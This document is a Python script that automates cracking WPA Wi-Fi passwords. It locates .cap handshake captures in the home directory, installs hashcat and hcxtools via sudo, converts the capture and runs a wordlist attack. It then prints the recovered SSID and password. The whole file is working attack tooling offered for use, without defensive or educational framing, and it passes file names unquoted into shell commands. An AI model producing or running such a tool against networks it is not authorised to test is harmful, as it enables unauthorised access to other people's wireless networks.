#!/usr/bin/env python3
import os
import subprocess

def run_cmd(cmd, capture_output=False):
    print(f"[+] Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=capture_output, text=True)
    if result.returncode != 0:
        print(f"[!] Command failed: {cmd}")
        exit(1)
    return result.stdout if capture_output else None

# 1. Auto-detect current user's home directory
cap_dir = os.path.expanduser("~")
print(f"[+] Scanning for .cap files in {cap_dir}...")

# Scan recursively for .cap files
cap_files = []
for root, dirs, files in os.walk(cap_dir):
    for f in files:
        if f.endswith(".cap"):
            cap_files.append(os.path.join(root, f))

if not cap_files:
    print(f"[!] No .cap files found in {cap_dir}")
    exit(1)

print("\nAvailable .cap files:")
for idx, f in enumerate(cap_files):
    print(f"{idx+1}. {f}")

while True:
    choice = input("\nSelect a .cap file by number: ")
    if choice.isdigit() and 1 <= int(choice) <= len(cap_files):
        cap_file = cap_files[int(choice)-1]
        break
    print("[!] Invalid choice, try again.")

print(f"[+] Selected capture file: {cap_file}")

# 2. Install dependencies
print("[+] Installing dependencies (Python3, pip, Hashcat, hcxtools)...")
run_cmd("sudo apt update -y && sudo apt install -y python3 python3-pip hashcat hcxtools")

# 3. Convert .cap to .hc22000
hc22000_file = cap_file.replace(".cap", ".hc22000")
print(f"[+] Converting {cap_file} to {hc22000_file}...")
run_cmd(f"hcxpcapngtool -o {hc22000_file} {cap_file}")
# 4. Let user select wordlist
wordlists_dir = "/usr/share/wordlists"
wordlists = [f for f in os.listdir(wordlists_dir) if os.path.isfile(os.path.join(wordlists_dir, f))]
if not wordlists:
    print(f"[!] No wordlists found in {wordlists_dir}")
    exit(1)

print("\nAvailable wordlists:")
for idx, wl in enumerate(wordlists):
    print(f"{idx+1}. {wl}")


while True:
    choice = input("\nSelect a wordlist by number: ")
    if choice.isdigit() and 1 <= int(choice) <= len(wordlists):
        wordlist_file = os.path.join(wordlists_dir, wordlists[int(choice)-1])
        break
    print("[!] Invalid choice, try again.")

print(f"[+] Using wordlist: {wordlist_file}")

# 5. Crack the handshake
print(f"[+] Starting Hashcat with {wordlist_file}...")
potfile = "temp.pot"
hashcat_cmd = f"hashcat -m 22000 -a 0 {hc22000_file} {wordlist_file} --potfile-path {potfile} --quiet"
run_cmd(hashcat_cmd)

# 6. Extract cracked password from potfile
if os.path.exists(potfile):
    found = False
    with open(potfile, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            # Hashcat 22000 format: <hash>:<SSID>:<password>
            parts = line.split(":")
            if len(parts) >= 4:
                ssid = parts[-2]
                password = parts[-1]
                print(f"\n[✓] SSID: {ssid}\n[✓] Password: {password}")
                found = True
                break
    if not found:
        print("[!] No password found in potfile. Try a different wordlist or check your .cap file.")
else:
    print("[!] Potfile not found. Hashcat may have failed.")


